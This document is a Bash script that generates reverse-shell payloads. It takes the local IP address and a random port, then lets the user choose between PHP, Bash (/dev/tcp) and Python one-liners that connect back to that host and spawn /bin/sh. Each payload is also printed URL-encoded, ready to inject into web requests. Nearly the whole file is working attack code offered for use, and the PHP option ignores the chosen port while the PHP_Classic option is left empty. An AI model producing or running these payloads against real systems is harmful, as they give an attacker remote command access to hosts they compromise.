#!/bin/bash
source ~/.bash_functions

echo "This script is used automate the creation of reverse shells"
echo ""

# Obtain the IP Address
ip_addr=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo "Your IP Address: $ip_addr"

# Select Random Port Number from 3000 - 6000
rand() {
  local min=$1
  local max=$2
  echo $(( RANDOM % (max - min + 1) + min ))
}
ip_port=$(rand 3000 6000)
echo "Your IP Port: $ip_port"

# Create a list of reverse shells
PS3="Which shell will you use today: "
list_of_shells=("PHP_One_Liner" "PHP_Classic" "Bash" "Python")

select shell in "${list_of_shells[@]}"; do
    case "$REPLY" in
        1)
	    echo ''
	    # PHP-One-Liner-Shell specific code is here
	    php_one_liner_shell='php -r '\''$sock=fsockopen("'"$ip_addr"'",1234);exec("/bin/sh -i <&3 >&3 2>&3");'\'''
	    echo "PHP_One_Liner_Shell: $php_one_liner_shell"
	    echo ''
	    echo "PHP_One_Liner_Shell (Encoded): $(burp_urlencode "$php_one_liner_shell")"
	    break;;
        2)
	    echo ''
            # Your PHP_Classic specific code here
            ;;
        3)
            echo ''
            # Your Bash specific code here
	    bash_rev_shell="bash -i >& /dev/tcp/"$ip_addr"/"$ip_port" 0>&1"
	    echo "Bash_Reverse_Shell: $bash_rev_shell"
	    echo ''
	    echo "Bash_Reverse_Shell (Encoded): $(burp_urlencode "$bash_rev_shell")"
            break;;
        4)
            echo ''
            # Your Python specific code here
	    python_rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip_addr","$ip_port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
            echo "Python_Reverse_Shell: $python_rev_shell"
	    echo ''
	    echo "Python_Reverse_Shell (Encoded): $(burp_urlencode "$python_rev_shell")";;
        *)
            echo "Invalid choice, try again."
            ;;
    esac
done
